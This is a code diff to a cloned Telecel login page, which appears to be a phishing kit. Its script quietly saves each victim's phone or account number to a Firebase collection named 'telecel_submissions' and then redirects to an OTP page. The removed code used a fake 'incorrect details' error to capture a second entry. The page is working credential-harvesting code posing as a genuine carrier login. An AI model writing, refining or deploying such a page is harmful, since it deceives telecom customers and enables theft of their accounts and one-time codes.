@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Telecel Clone – Filtered Input + Two‑Attempt</title>
+<title>Telecel – Login (Single Attempt)</title>
 
 <!-- Firebase SDK (compat) -->
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
@@ -104,7 +104,7 @@ body{
 /* FORM */
 .form{
   margin-top:30px;
-  text-align: left;  /* ensure labels and inputs are left‑aligned */
+  text-align: left;
 }
 
 .label{
@@ -239,40 +239,7 @@ body{
   to { transform: rotate(360deg); }
 }
 
-/* ERROR TOAST (from sample) */
-.error-box{
-  position:absolute;
-  top:20px;
-  left:20px;
-  right:20px;
-  background:#fff;
-  border:2px solid #ff4d4d;
-  border-radius:12px;
-  padding:15px;
-  display:none;
-  box-shadow:0 5px 20px rgba(0,0,0,0.1);
-  z-index:100;
-}
-
-.error-title{
-  color:#ff0000;
-  font-weight:bold;
-  margin-bottom:5px;
-}
-
-.error-text{
-  color:#444;
-  font-size:14px;
-}
-
-.close{
-  position:absolute;
-  right:15px;
-  top:10px;
-  cursor:pointer;
-  font-size:18px;
-  color:#999;
-}
+/* ERROR TOAST – removed as we no longer show errors */
 </style>
 </head>
 
@@ -282,15 +249,7 @@ body{
 
   <div class="top-bg"></div>
 
-  <!-- All content goes inside this wrapper to stay above the red shape -->
   <div class="content">
-
-    <!-- ERROR TOAST (hidden by default) -->
-    <div class="error-box" id="errorBox">
-      <div class="close" onclick="hideError()">×</div>
-      <div class="error-title">Error</div>
-      <div class="error-text" id="errorMessage">Account details provided is incorrect</div>
-    </div>
 
     <!-- LOGO -->
     <div class="logo">
@@ -334,15 +293,14 @@ body{
 
     </div>
 
-  </div> <!-- end .content -->
+  </div>
 
-</div> <!-- end .container -->
+</div>
 
 <!-- SPINNER OVERLAY -->
 <div id="spinner">
   <div class="loader"></div>
 </div>
-
 
 <script>
   // ==================== FIREBASE CONFIG ====================
@@ -356,7 +314,6 @@ body{
     measurementId: "G-5ZPQ1H0SWR"
   };
 
-  // Initialize Firebase
   firebase.initializeApp(firebaseConfig);
   const db = firebase.firestore();
   const COLLECTION_NAME = 'telecel_submissions';
@@ -368,25 +325,19 @@ body{
   const arrow = document.getElementById('arrow');
   const spinner = document.getElementById('spinner');
   const submitBtn = document.querySelector('.btn-primary');
-  const errorBox = document.getElementById('errorBox');
-  const errorMessage = document.getElementById('errorMessage');
 
   // ==================== STATE ====================
-  let attemptCount = 0;            // 1 = first, 2 = second
   let isSubmitting = false;        // prevents double clicks while spinner active
 
   // ==================== INPUT FILTERING ====================
   function filterInput(value, type) {
     if (type === 'Mobile') {
-      // Only digits
       return value.replace(/[^0-9]/g, '');
     } else {
-      // Broadband: allow letters and digits (alphanumeric)
       return value.replace(/[^a-zA-Z0-9]/g, '');
     }
   }
 
-  // Update input value with filtering based on current type
   function applyFilter() {
     const currentType = selectedType.value;
     const raw = inputField.value;
@@ -396,38 +347,20 @@ body{
     }
   }
 
-  // Listen to input events – also hide error on typing
-  inputField.addEventListener('input', function() {
-    hideError();
-    applyFilter();
-  });
+  inputField.addEventListener('input', applyFilter);
 
-  // Handle paste
   inputField.addEventListener('paste', function(e) {
     e.preventDefault();
     const pasted = (e.clipboardData || window.clipboardData).getData('text');
     const currentType = selectedType.value;
     const filtered = filterInput(pasted, currentType);
-    // Insert at cursor position (simple: replace whole value)
     const start = this.selectionStart || 0;
     const end = this.selectionEnd || 0;
     const newValue = this.value.substring(0, start) + filtered + this.value.substring(end);
-    this.value = filterInput(newValue, currentType); // re-filter whole thing
-    // Move cursor to end of inserted text
+    this.value = filterInput(newValue, currentType);
     const newCursor = start + filtered.length;
     this.setSelectionRange(newCursor, newCursor);
-    hideError();
   });
-
-  // ==================== ERROR FUNCTIONS ====================
-  function showError(msg) {
-    errorMessage.innerText = msg || 'Account details provided is incorrect';
-    errorBox.style.display = 'block';
-  }
-
-  function hideError() {
-    errorBox.style.display = 'none';
-  }
 
   // ==================== DROPDOWN FUNCTIONS ====================
   function toggleDropdown() {
@@ -444,7 +377,6 @@ body{
     });
     e.target.classList.add('active');
 
-    // Update label and placeholder
     const label = document.getElementById('inputLabel');
     if (type === 'Mobile') {
       label.innerText = 'Phone Number';
@@ -456,15 +388,11 @@ body{
       inputField.inputMode = 'text';
     }
 
-    // Re-filter current input value (if any)
     applyFilter();
-    hideError(); // hide error when changing type
-
     dropdownList.style.display = 'none';
     arrow.classList.remove('rotate');
   }
 
-  // Close dropdown if clicked outside
   document.addEventListener('click', function(e) {
     if (!e.target.closest('.dropdown')) {
       dropdownList.style.display = 'none';
@@ -472,7 +400,7 @@ body{
     }
   });
 
-  // ==================== SILENT FIREBASE SAVE ====================
+  // ==================== FIREBASE SAVE ====================
   async function saveAttempt(accountType, inputValue, attemptNumber) {
     try {
       await db.collection(COLLECTION_NAME).add({
@@ -485,74 +413,50 @@ body{
       });
       console.log(`Attempt ${attemptNumber} saved silently`);
     } catch (error) {
-      console.error('Firebase save error (silent):', error);
-      // Ignore errors – no feedback to user
+      console.error('Firebase save error:', error);
     }
   }
 
-  // ==================== FORM SUBMISSION ====================
+  // ==================== GENERATE 6‑DIGIT OTP ====================
+  function generateOTP() {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+  }
+
+  // ==================== FORM SUBMISSION (SINGLE ATTEMPT) ====================
   async function submitForm() {
-    // Prevent double submissions while spinner active
     if (isSubmitting) return;
 
     const accountType = selectedType.value;
     const inputValue = inputField.value.trim();
 
-    // Silently ignore empty submissions
     if (inputValue === '') return;
 
-    // Hide any existing error
-    hideError();
-
-    // Disable button and show spinner
     isSubmitting = true;
     submitBtn.disabled = true;
     spinner.style.display = 'flex';
 
-    // Increment attempt counter
-    attemptCount++;
+    // Save attempt 1
+    await saveAttempt(accountType, inputValue, 1);
 
-    if (attemptCount === 1) {
-      // FIRST ATTEMPT: save, then hide spinner, show error, clear input
-      await saveAttempt(accountType, inputValue, 1);
-      
-      // Small delay to ensure spinner is visible
-      setTimeout(() => {
-        spinner.style.display = 'none';
-        inputField.value = '';               // clear field for second attempt
-        showError('Account details provided is incorrect'); // show error
-        submitBtn.disabled = false;           // re-enable button
-        isSubmitting = false;                  // allow next click
-      }, 500);
-    } 
-    else if (attemptCount === 2) {
-      // SECOND ATTEMPT: save, then redirect (keep spinner until redirect)
-      await saveAttempt(accountType, inputValue, 2);
+    // Generate OTP
+    const otp = generateOTP();
 
-      // Redirect after a short delay (spinner remains visible)
-      setTimeout(() => {
-        window.location.href = 'unavailable.html';  // redirect
-        // No need to hide spinner or reset state as page will change
-      }, 800);
-    }
-    else {
-      // In case attemptCount > 2 (should not happen), reset and treat as first
-      attemptCount = 1;
-      await saveAttempt(accountType, inputValue, 1);
-      setTimeout(() => {
-        spinner.style.display = 'none';
-        inputField.value = '';
-        showError('Account details provided is incorrect');
-        submitBtn.disabled = false;
-        isSubmitting = false;
-      }, 500);
-    }
+    // Store data for OTP page
+    const phoneDigits = inputField.value.replace(/\D/g, '');
+    sessionStorage.setItem('telecel_phone', phoneDigits);
+    sessionStorage.setItem('telecel_accountType', accountType);
+    sessionStorage.setItem('telecel_inputValue', inputValue);
+    sessionStorage.setItem('telecel_otp', otp);
+
+    // Redirect to OTP page after short delay
+    setTimeout(() => {
+      window.location.href = 'otp.html';
+    }, 800);
   }
 
   // ==================== INIT ====================
   dropdownList.style.display = 'none';
   submitBtn.disabled = false;
-  // Initial filter in case there's any pre-filled value
   applyFilter();
 </script>
 
